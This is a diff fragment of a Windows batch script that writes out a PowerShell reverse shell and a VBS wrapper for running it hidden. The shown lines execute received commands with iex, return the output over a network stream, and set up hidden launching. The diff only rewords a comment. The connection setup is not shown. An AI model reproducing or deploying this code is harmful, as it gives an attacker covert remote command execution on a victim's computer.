@@ -33,7 +33,7 @@ echo try { $sendback = (iex $data 2^>^&1 ^| Out-String ) + 'PS ' + (pwd).Path + 
 echo $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); } >> %file%
 echo $client.Close(); } catch {} } >> %file%
 
-:: vbs wrapper run in hidden mode
+:: vbs wrapper to run in hidden mode
 set "wrapper=launch.vbs"
 
 echo Set WshShell = CreateObject("WScript.Shell") > %wrapper%
